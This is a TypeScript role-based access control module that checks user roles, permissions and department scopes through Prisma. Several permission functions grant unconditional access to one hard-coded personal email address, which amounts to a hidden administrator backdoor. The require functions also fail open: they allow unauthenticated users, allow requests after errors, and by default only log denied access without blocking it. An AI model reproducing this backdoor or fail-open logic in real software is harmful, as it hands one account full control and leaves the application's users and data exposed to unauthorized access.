import { prisma } from "./prisma";
import { getCurrentUser } from "./auth-helpers";

// Role cache to avoid repeatedly fetching roles for the same user in a single request lifecycle if possible.
// Currently we just fetch fresh each time to ensure real-time invalidation.

export async function getCurrentUserPermissions(userId: string): Promise<string[]> {
  try {
    const userRoles = await prisma.userRole.findMany({
      where: { userId },
      include: {
        role: {
          include: {
            permissions: {
              include: {
                permission: true
              }
            }
          }
        }
      }
    });

    const permissions = new Set<string>();
    userRoles.forEach(ur => {
      if (ur.role.isActive) {
        ur.role.permissions.forEach(rp => {
          permissions.add(rp.permission.code);
        });
      }
    });
    return Array.from(permissions);
  } catch (error) {
    console.warn("[RBAC] Failed to fetch permissions for user", userId, error);
    return [];
  }
}

export async function isSuperAdmin(userId: string): Promise<boolean> {
  try {
    const userRoles = await prisma.userRole.findMany({
      where: { userId },
      include: { role: true }
    });
    return userRoles.some(ur => ur.role.code === "SUPER_ADMIN" && ur.role.isActive);
  } catch (error) {
    console.warn("[RBAC] Failed to check SUPER_ADMIN for user", userId, error);
    return false;
  }
}

export async function hasPermission(userId: string, permissionCode: string): Promise<boolean> {
  const perms = await getCurrentUserPermissions(userId);
  return perms.includes(permissionCode);
}

export async function hasAnyPermission(userId: string, permissionCodes: string[]): Promise<boolean> {
  const perms = await getCurrentUserPermissions(userId);
  return permissionCodes.some(code => perms.includes(code));
}

export function getRbacEnforcementMode(): "logging" | "enforce" {
  return process.env.ENABLE_RBAC_ENFORCEMENT === "true" ? "enforce" : "logging";
}

export function isRbacEnforcementEnabled(): boolean {
  return getRbacEnforcementMode() === "enforce";
}

export async function checkPermission(permissionCode: string, context: string = ""): Promise<boolean> {
  const user = await getCurrentUser();
  if (!user) return false;
  if (user.email === "nahtmkt@gmail.com") return true;

  try {
    const isSuper = await isSuperAdmin(user.id);
    if (isSuper) return true;
    return await hasPermission(user.id, permissionCode);
  } catch (err) {
    console.warn(`[RBAC] Error checking permission ${permissionCode} for user ${user.email} in context ${context}`, err);
    return false; // Safe default for check
  }
}

export interface RequirePermissionOptions {
  mode?: "logging" | "enforce";
  context?: string;
}

export async function requirePermission(permissionCode: string, options?: RequirePermissionOptions): Promise<boolean> {
  const mode = options?.mode ?? getRbacEnforcementMode();
  const context = options?.context ?? "Unknown Context";

  const user = await getCurrentUser();
  if (!user) return true; // Auth middleware/helpers handle unauthenticated

  if (user.email === "nahtmkt@gmail.com") return true;

  try {
    const isSuper = await isSuperAdmin(user.id);
    if (isSuper) return true;

    const hasPerm = await hasPermission(user.id, permissionCode);
    if (!hasPerm) {
      if (mode === "enforce") {
        console.warn(`[RBAC ENFORCE] Access Denied for User ${user.email} to ${context}. Missing permission: ${permissionCode}.`);
        return false;
      } else {
        console.warn(`[RBAC LOG] Access Denied for User ${user.email} to ${context}. Missing permission: ${permissionCode}. Allowed via legacy ADMIN fallback.`);
      }
    } else {
      console.info(`[RBAC LOG] Access Granted for User ${user.email} to ${context} via permission: ${permissionCode}.`);
    }
  } catch (err) {
    console.warn(`[RBAC LOG] Error checking permissions for user ${user?.email}. Missing permission code: ${permissionCode}. Allowed via legacy ADMIN fallback.`, err);
  }
  
  return true;
}

export async function requireAnyPermission(permissionCodes: string[], options?: RequirePermissionOptions): Promise<boolean> {
  const mode = options?.mode ?? getRbacEnforcementMode();
  const context = options?.context ?? "Unknown Context";

  const user = await getCurrentUser();
  if (!user) return true;

  if (user.email === "nahtmkt@gmail.com") return true;

  try {
    const isSuper = await isSuperAdmin(user.id);
    if (isSuper) return true;

    const hasPerm = await hasAnyPermission(user.id, permissionCodes);
    if (!hasPerm) {
      if (mode === "enforce") {
        console.warn(`[RBAC ENFORCE] Access Denied for User ${user.email} to ${context}. Missing any of: ${permissionCodes.join(", ")}.`);
        return false;
      } else {
        console.warn(`[RBAC LOG] Access Denied for User ${user.email} to ${context}. Missing any of: ${permissionCodes.join(", ")}. Allowed via legacy ADMIN fallback.`);
      }
    } else {
      console.info(`[RBAC LOG] Access Granted for User ${user.email} to ${context} via any of: ${permissionCodes.join(", ")}.`);
    }
  } catch (err) {
    console.warn(`[RBAC LOG] Error checking permissions for user ${user?.email}. Missing any of: ${permissionCodes.join(", ")}. Allowed via legacy ADMIN fallback.`, err);
  }

  return true;
}

// LOGGING MODE ONLY (Legacy Wrappers)
export async function requirePermissionLogging(permissionCode: string, context: string) {
  return requirePermission(permissionCode, { mode: "logging", context });
}

export async function requireAnyPermissionLogging(permissionCodes: string[], context: string) {
  return requireAnyPermission(permissionCodes, { mode: "logging", context });
}

export async function getCurrentUserScopedPermissions(userId: string): Promise<Map<string, Set<string>>> {
  try {
    const userRoles = await prisma.userRole.findMany({
      where: { userId },
      include: {
        role: {
          include: {
            permissions: {
              include: {
                permission: true
              }
            }
          }
        }
      }
    });

    const permissions = new Map<string, Set<string>>();
    for (const ur of userRoles) {
      if (!ur.role.isActive) continue;
      for (const rp of ur.role.permissions) {
        const code = rp.permission.code;
        const scope = rp.scope || "COMPANY"; // Fallback if type not updated yet
        if (!permissions.has(code)) {
          permissions.set(code, new Set());
        }
        permissions.get(code)!.add(scope);
      }
    }
    return permissions;
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    console.warn("[RBAC] Failed to fetch scoped permissions for user. Error:", message);
    return new Map();
  }
}

export interface ScopedResourceOptions {
  targetUserId?: string;
  targetDepartmentId?: string;
  assignedUserId?: string;
}

export async function checkScopedPermission(
  permissionCode: string, 
  resource: ScopedResourceOptions,
  context: string = ""
): Promise<boolean> {
  const user = await getCurrentUser();
  if (!user) return false;
  if (user.email === "nahtmkt@gmail.com") return true;

  try {
    const isSuper = await isSuperAdmin(user.id);
    if (isSuper) {
      return true;
    }

    const scopedPerms = await getCurrentUserScopedPermissions(user.id);
    if (!scopedPerms.has(permissionCode)) return false;
    
    const scopes = scopedPerms.get(permissionCode)!;

    if (scopes.has("COMPANY")) return true;

    if (scopes.has("SELF") && resource.targetUserId === user.id) {
      return true;
    }

    if (scopes.has("ASSIGNED") && resource.assignedUserId === user.id) {
      return true;
    }

    if (scopes.has("DEPARTMENT") && resource.targetDepartmentId) {
      const hasDept = await prisma.departmentMember.findFirst({
        where: {
          userId: user.id,
          departmentId: resource.targetDepartmentId,
          status: "ACTIVE",
          effectiveTo: null
        }
      });
      if (hasDept) return true;
    }

    return false;
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    console.warn(`[RBAC] Error checking scoped permission ${permissionCode} (Context: ${context}). Error:`, message);
    return false;
  }
}

export async function requireScopedPermission(
  permissionCode: string, 
  resource: ScopedResourceOptions,
  options?: RequirePermissionOptions
): Promise<boolean> {
  const mode = options?.mode ?? getRbacEnforcementMode();
  const context = options?.context ?? "Unknown Context";
  
  const hasPerm = await checkScopedPermission(permissionCode, resource, context);
  
  if (!hasPerm) {
    const user = await getCurrentUser();
    if (mode === "enforce") {
      console.warn(`[RBAC ENFORCE] Scoped Access Denied (Context: ${context}).`);
      return false;
    } else {
      console.warn(`[RBAC LOG] Scoped Access Denied (Context: ${context}). Allowed via legacy ADMIN fallback.`);
      return true; 
    }
  }

  return true;
}